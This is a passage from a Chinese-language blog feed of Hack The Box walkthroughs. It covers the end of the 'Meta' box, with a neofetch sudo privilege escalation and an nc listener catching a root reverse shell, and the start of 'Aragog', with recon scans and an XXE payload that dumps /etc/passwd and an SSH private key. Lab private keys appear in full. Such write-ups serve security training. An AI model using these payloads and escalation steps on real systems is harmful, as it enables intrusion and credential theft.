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 <br>bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE=<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh -i id_rsa thomas@10.10.11.140<br>Linux meta 4.19.0-17-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.194-3 (2021-07-18) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>thomas@meta:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> thomas on meta:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,<br>    env_keep+=XDG_CONFIG_HOME<br><br>User thomas may run the following commands on meta:<br>    (root) NOPASSWD: /usr/bin/neofetch \&quot;\&quot;<br>thomas@meta:~$ <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">thomas@meta:~$ <span class="hljs-built_in">export</span> XDG_CONFIG_HOME=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/.config&quot;</span><br>thomas@meta:~$ <span class="hljs-built_in">ls</span> -all<br>total 36<br>drwxr-xr-x 5 thomas thomas 4096 Jun  7 13:57 .<br>drwxr-xr-x 3 root   root   4096 Aug 29  2021 ..<br>lrwxrwxrwx 1 root   root      9 Aug 29  2021 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 thomas thomas  220 Aug 29  2021 .bash_logout<br>-rw-r--r-- 1 thomas thomas 3526 Aug 29  2021 .bashrc<br>drwxr-xr-x 3 thomas thomas 4096 Aug 30  2021 .config<br>drwx------ 3 thomas thomas 4096 Jun  7 13:57 .gnupg<br>-rw-r--r-- 1 thomas thomas  807 Aug 29  2021 .profile<br>drwx------ 2 thomas thomas 4096 Jan  4 10:22 .ssh<br>-rw-r----- 1 root   thomas   33 Jun  7 12:36 user.txt<br>thomas@meta:~$ <span class="hljs-built_in">cd</span> .config/<br>thomas@meta:~/.config$ <span class="hljs-built_in">ls</span><br>neofetch<br>thomas@meta:~/.config$ <span class="hljs-built_in">cd</span> neofetch/<br>thomas@meta:~/.config/neofetch$ <span class="hljs-built_in">ls</span><br>config.conf<br>thomas@meta:~/.config/neofetch$ vim config.conf <br>thomas@meta:~/.config/neofetch$ sudo -u root /usr/bin/neofetch \&quot;\&quot;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nc -lvnp 1337 <br>listening on [any] 1337 ...<br>connect to [10.10.16.8] from (UNKNOWN) [10.10.11.140] 34908<br>root@meta:/home/thomas/.config/neofetch<span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>config.conf<br>root@meta:/home/thomas/.config/neofetch<span class="hljs-comment"># cd ~</span><br><span class="hljs-built_in">cd</span> ~<br>root@meta:~<span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>conf<br>root.txt<br>root@meta:~<span class="hljs-comment"># cat root.txt</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Aragog</title>
    <link href="/post/HackTheBox-Aragog.html"/>
    <url>/post/HackTheBox-Aragog.html</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Aragog.png" alt="Aragog"></p><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.78<br>[sudo] crazyinside 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-29 01:50:39 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 80/tcp on 10.10.10.78                                     <br>Discovered open port 21/tcp on 10.10.10.78                                     <br>Discovered open port 22/tcp on 10.10.10.78    <br>Crazy:~$ sudo nmap -sC -sV 10.10.11.78 -p80,21,22 -Pn <br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-29 09:53 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.78<br>Host is up.<br><br>PORT   STATE    SERVICE VERSION<br>21/tcp filtered ftp<br>22/tcp filtered ssh<br>80/tcp filtered http<br><br>Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.56 seconds<br>zsh: segmentation fault  sudo nmap -sC -sV 10.10.11.78 -p80,21,22 -Pn<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ feroxbuster -u http://10.10.10.78/ -e<br><br> ___  ___  __   __     __      __         __   ___<br>|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__<br>|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___<br>by Ben <span class="hljs-string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.7.0<br>───────────────────────────┬──────────────────────<br> 🎯  Target Url            │ http://10.10.10.78/<br> 🚀  Threads               │ 50<br> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<br> 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]<br> 💥  Timeout (secs)        │ 7<br> 🦡  User-Agent            │ feroxbuster/2.7.0<br> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml<br> 🔎  Extract Links         │ <span class="hljs-literal">true</span><br> 🏁  HTTP methods          │ [GET]<br> 🔃  Recursion Depth       │ 4<br> 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest<br>───────────────────────────┴──────────────────────<br> 🏁  Press [ENTER] to use the Scan Management Menu™<br>──────────────────────────────────────────────────<br>200      GET       15l       74w     3338c http://10.10.10.78/icons/ubuntu-logo.png<br>200      GET      375l      968w    11321c http://10.10.10.78/<br>403      GET       11l       32w      292c http://10.10.10.78/icons/<br>200      GET      166l      644w     5108c http://10.10.10.78/icons/README<br>403      GET       11l       32w      299c http://10.10.10.78/server-status<br>301      GET        9l       28w      316c http://10.10.10.78/icons/small =&gt; http://10.10.10.78/icons/small/<br></code></pre></td></tr></table></figure><p>FTP里有</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">ftp&gt; user<br>(username) anonymous<br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||42091|)<br>150 Here comes the directory listing.<br>-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt<br>226 Directory send OK.<br>ftp&gt; get test.txt<br><span class="hljs-built_in">local</span>: test.txt remote: test.txt<br>229 Entering Extended Passive Mode (|||49152|)<br>150 Opening BINARY mode data connection <span class="hljs-keyword">for</span> test.txt (86 bytes).<br>100% |****************************************************************************************************|    86        1.94 KiB/s    00:00 ETA<br>226 Transfer complete.<br>86 bytes received <span class="hljs-keyword">in</span> 00:00 (0.61 KiB/s)<br>ftp&gt; <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ <span class="hljs-built_in">cat</span> test.txt                   <br>&lt;details&gt;<br>    &lt;subnet_mask&gt;255.255.255.192&lt;/subnet_mask&gt;<br>    &lt;<span class="hljs-built_in">test</span>&gt;&lt;/test&gt;<br>&lt;/details&gt;<br></code></pre></td></tr></table></figure><p>共享与FTP似乎是没有关联的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ gobuster <span class="hljs-built_in">dir</span> -u http://10.10.10.78 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 100<br>===============================================================<br>Gobuster v3.1.0<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://10.10.10.78<br>[+] Method:                  GET<br>[+] Threads:                 100<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.1.0<br>[+] Extensions:              txt,php,html<br>[+] Timeout:                 10s<br>===============================================================<br>2022/08/29 10:03:55 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.html           (Status: 200) [Size: 11321]<br>/hosts.php            (Status: 200) [Size: 46]   <br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829100634427.png" alt="image-20220829100634427"></p><h2 id="User-txt"><a href="#User-txt" class="headerlink" title="User.txt"></a>User.txt</h2><p>计算可能主机的。抓个包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">GET</span> <span class="hljs-string">/hosts.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.78<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure><p>XML。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -X POST -d @test.txt http://10.10.10.78/hosts.php<br><br>There are 62 possible hosts <span class="hljs-keyword">for</span> 255.255.255.192<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ <span class="hljs-built_in">cat</span> test.xml                                          <br>&lt;!DOCTYPE foo[<br>&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY xxe SYSTEM <span class="hljs-string">&quot;file:///etc/lsb-release&quot;</span>&gt; ]&gt;<br>&lt;details&gt;<br>    &lt;subnet_mask&gt;&amp;xxe;&lt;/subnet_mask&gt;<br>    &lt;<span class="hljs-built_in">test</span>&gt;&lt;/test&gt;<br>&lt;/details&gt;<br><br>Crazy:~/HackTheBox$ curl -X POST -d @test.xml http://10.10.10.78/hosts.php<br><br>There are 4294967294 possible hosts <span class="hljs-keyword">for</span> DISTRIB_ID=Ubuntu<br>DISTRIB_RELEASE=16.04<br>DISTRIB_CODENAME=xenial<br>DISTRIB_DESCRIPTION=<span class="hljs-string">&quot;Ubuntu 16.04.3 LTS&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -X POST -d @test.xml http://10.10.10.78/hosts.php<br><br>There are 4294967294 possible hosts <span class="hljs-keyword">for</span> root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false<br>systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false<br>systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false<br>systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false<br>syslog:x:104:108::/home/syslog:/bin/false<br>_apt:x:105:65534::/nonexistent:/bin/false<br>messagebus:x:106:110::/var/run/dbus:/bin/false<br>uuidd:x:107:111::/run/uuidd:/bin/false<br>lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false<br>whoopsie:x:109:117::/nonexistent:/bin/false<br>avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false<br>avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false<br>dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false<br>colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false<br>speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false<br>hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false<br>kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false<br>pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false<br>rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false<br>saned:x:119:127::/var/lib/saned:/bin/false<br>usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false<br>florian:x:1000:1000:florian,,,:/home/florian:/bin/bash<br>cliff:x:1001:1001::/home/cliff:/bin/bash<br>mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false<br>sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin<br>ftp:x:123:130:ftp daemon,,,:/srv/ftp:/bin/false<br></code></pre></td></tr></table></figure><p>可以读取到florian用户的ssh秘钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -X POST -d @test.xml http://10.10.10.78/hosts.php<br><br>There are 4294967294 possible hosts <span class="hljs-keyword">for</span> <br>-----BEGIN RSA PRIVATE KEY-----<br>MIIEpAIBAAKCAQEA50DQtmOP78gLZkBjJ/JcC5gmsI21+tPH3wjvLAHaFMmf7j4d<br>+YQEMbEg+yjj6/ybxJAsF8l2kUhfk56LdpmC3mf/sO4romp9ONkl9R4cu5OB5ef8<br>lAjOg67dxWIo77STqYZrWUVnQ4n8dKG4Tb/z67+gT0R9lD9c0PhZwRsFQj8aKFFn<br>1R1B8n9/e1PB0AJ81PPxCc3RpVJdwbq8BLZrVXKNsg+SBUdbBZc3rBC81Kle2CB+<br>Ix89HQ3deBCL3EpRXoYVQZ4EuCsDo7UlC8YSoEBgVx4IgQCWx34tXCme5cJa/UJd<br>d4Lkst4w4sptYMHzzshmUDrkrDJDq6olL4FyKwIDAQABAoIBAAxwMwmsX0CRbPOK<br>AQtUANlqzKHwbVpZa8W2UE74poc5tQ12b9xM2oDluxVnRKMbyjEPZB+/aU41K1bg<br>TzYI2b4mr90PYm9w9N1K6Ly/auI38+Ouz6oSszDoBeuo9PS3rL2QilOZ5Qz/7gFD<br>9YrRCUij3PaGg46mvdJLmWBGmMjQS+ZJ7w1ouqsIANypMay2t45v2Ak+SDhl/SDb<br>/oBJFfnOpXNtQfJZZknOGY3SlCWHTgMCyYJtjMCW2Sh2wxiQSBC8C3p1iKWgyaSV<br>0qH/3gt7RXd1F3vdvACeuMmjjjARd+LNfsaiu714meDiwif27Knqun4NQ+2x8JA1<br>sWmBdcECgYEA836Z4ocK0GM7akW09wC7PkvjAweILyq4izvYZg+88Rei0k411lTV<br>Uahyd7ojN6McSd6foNeRjmqckrKOmCq2hVOXYIWCGxRIIj5WflyynPGhDdMCQtIH<br>zCr9VrMFc7WCCD+C7nw2YzTrvYByns/Cv+uHRBLe3S4k0KNiUCWmuYsCgYEA8yFE<br>rV5bD+XI/iOtlUrbKPRyuFVUtPLZ6UPuunLKG4wgsGsiVITYiRhEiHdBjHK8GmYE<br>tkfFzslrt+cjbWNVcJuXeA6b8Pala7fDp8lBymi8KGnsWlkdQh/5Ew7KRcvWS5q3<br>HML6ac06Ur2V0ylt1hGh/A4r4YNKgejQ1CcO/eECgYEAk02wjKEDgsO1avoWmyL/<br>I5XHFMsWsOoYUGr44+17cSLKZo3X9fzGPCs6bIHX0k3DzFB4o1YmAVEvvXN13kpg<br>ttG2DzdVWUpwxP6PVsx/ZYCr3PAdOw1SmEodjriogLJ6osDBVcMhJ+0Y/EBblwW7<br>HF3BLAZ6erXyoaFl1XShozcCgYBuS+JfEBYZkTHscP0XZD0mSDce/r8N07odw46y<br>kM61To2p2wBY/WdKUnMMwaU/9PD2vN9YXhkTpXazmC0PO+gPzNYbRe1ilFIZGuWs<br>4XVyQK9TWjI6DoFidSTGi4ghv8Y4yDhX2PBHPS4/SPiGMh485gTpVvh7Ntd/NcI+<br>7HU1oQKBgQCzVl/pMQDI2pKVBlM6egi70ab6+Bsg2U20fcgzc2Mfsl0Ib5T7PzQ3<br>daPxRgjh3CttZYdyuTK3wxv1n5FauSngLljrKYXb7xQfzMyO0C7bE5Rj8SBaXoqv<br>uMQ76WKnl3DkzGREM4fUgoFnGp8fNEZl5ioXfxPiH/Xl5nStkQ0rTA==<br>-----END RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ ssh -i id_rsa florian@10.10.10.78                               <br>The authenticity of host <span class="hljs-string">&#x27;10.10.10.78 (10.10.10.78)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:4bLLuCjTjPPZfGo5hd3YV/aaiWwIv3OCTqDYKlk1pgo.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.10.78<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">Last login: Fri Jan 12 13:56:45 2018 from 10.10.14.3</span><br><span class="hljs-string">florian@aragog:~$ ls</span><br><span class="hljs-string">Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos  examples.desktop  user.txt</span><br><span class="hljs-string">florian@aragog:~$ 